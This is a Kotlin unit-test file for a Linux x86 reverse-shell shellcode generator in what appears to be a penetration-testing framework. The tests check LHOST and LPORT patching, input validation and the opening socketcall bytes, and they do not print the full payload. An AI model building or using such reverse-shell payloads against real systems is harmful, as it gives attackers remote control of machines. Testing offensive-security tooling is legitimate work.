package anc.modules.payloads

import anc.modules.payloads.singles.linux.ReverseShellX86
import io.kotest.assertions.throwables.shouldThrow
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.shouldBe
import io.kotest.matchers.shouldNotBe
import kotlinx.coroutines.runBlocking

class ReverseShellX86Test : FunSpec({

    test("buildShellcode produces 80 bytes") {
        val sc = ReverseShellX86.buildShellcode("127.0.0.1", 4444)
        sc.size shouldBe 80
    }

    test("LHOST is patched correctly for 127.0.0.1") {
        val sc = ReverseShellX86.buildShellcode("127.0.0.1", 4444)
        sc[ReverseShellX86.LHOST_OFFSET].toInt() and 0xFF shouldBe 127
        sc[ReverseShellX86.LHOST_OFFSET + 1].toInt() and 0xFF shouldBe 0
        sc[ReverseShellX86.LHOST_OFFSET + 2].toInt() and 0xFF shouldBe 0
        sc[ReverseShellX86.LHOST_OFFSET + 3].toInt() and 0xFF shouldBe 1
    }

    test("LHOST is patched correctly for 192.168.1.100") {
        val sc = ReverseShellX86.buildShellcode("192.168.1.100", 4444)
        sc[ReverseShellX86.LHOST_OFFSET].toInt() and 0xFF shouldBe 192
        sc[ReverseShellX86.LHOST_OFFSET + 1].toInt() and 0xFF shouldBe 168
        sc[ReverseShellX86.LHOST_OFFSET + 2].toInt() and 0xFF shouldBe 1
        sc[ReverseShellX86.LHOST_OFFSET + 3].toInt() and 0xFF shouldBe 100
    }

    test("LPORT 4444 is patched as big-endian 0x115c") {
        val sc = ReverseShellX86.buildShellcode("127.0.0.1", 4444)
        sc[ReverseShellX86.LPORT_OFFSET].toInt() and 0xFF shouldBe 0x11
        sc[ReverseShellX86.LPORT_OFFSET + 1].toInt() and 0xFF shouldBe 0x5c
    }

    test("LPORT 443 is patched as big-endian 0x01bb") {
        val sc = ReverseShellX86.buildShellcode("10.0.0.1", 443)
        sc[ReverseShellX86.LPORT_OFFSET].toInt() and 0xFF shouldBe 0x01
        sc[ReverseShellX86.LPORT_OFFSET + 1].toInt() and 0xFF shouldBe 0xbb
    }

    test("different LHOST produces different shellcode") {
        val sc1 = ReverseShellX86.buildShellcode("1.2.3.4", 4444)
        val sc2 = ReverseShellX86.buildShellcode("5.6.7.8", 4444)
        sc1.toList() shouldNotBe sc2.toList()
    }

    test("different LPORT produces different shellcode") {
        val sc1 = ReverseShellX86.buildShellcode("127.0.0.1", 4444)
        val sc2 = ReverseShellX86.buildShellcode("127.0.0.1", 9001)
        sc1.toList() shouldNotBe sc2.toList()
    }

    test("invalid LPORT throws") {
        shouldThrow<IllegalArgumentException> { ReverseShellX86.buildShellcode("1.2.3.4", 0) }
        shouldThrow<IllegalArgumentException> { ReverseShellX86.buildShellcode("1.2.3.4", 65536) }
    }

    test("invalid LHOST throws") {
        shouldThrow<IllegalArgumentException> { ReverseShellX86.buildShellcode("not-an-ip", 4444) }
    }

    test("shellcode starts with SYS_SOCKETCALL push (0x6a 0x66)") {
        val sc = ReverseShellX86.buildShellcode("127.0.0.1", 4444)
        sc[0] shouldBe 0x6a.toByte()
        sc[1] shouldBe 0x66.toByte()
    }

    test("payload generate() uses LHOST and LPORT from datastore") {
        val payload = ReverseShellX86()
        payload.datastore["LHOST"] = "10.0.0.5"
        payload.datastore["LPORT"] = "9001"
        val bytes = runBlocking { payload.generate() }
        bytes.size shouldBe 80
        bytes[ReverseShellX86.LHOST_OFFSET].toInt() and 0xFF shouldBe 10
        bytes[ReverseShellX86.LPORT_OFFSET].toInt() and 0xFF shouldBe (9001 ushr 8)
    }

    test("toByteArrayLiteral formats correctly") {
        val payload = ReverseShellX86()
        val result = payload.toByteArrayLiteral(byteArrayOf(0xde.toByte(), 0xad.toByte()))
        result shouldBe "byteArrayOf(0xde, 0xad)"
    }
})
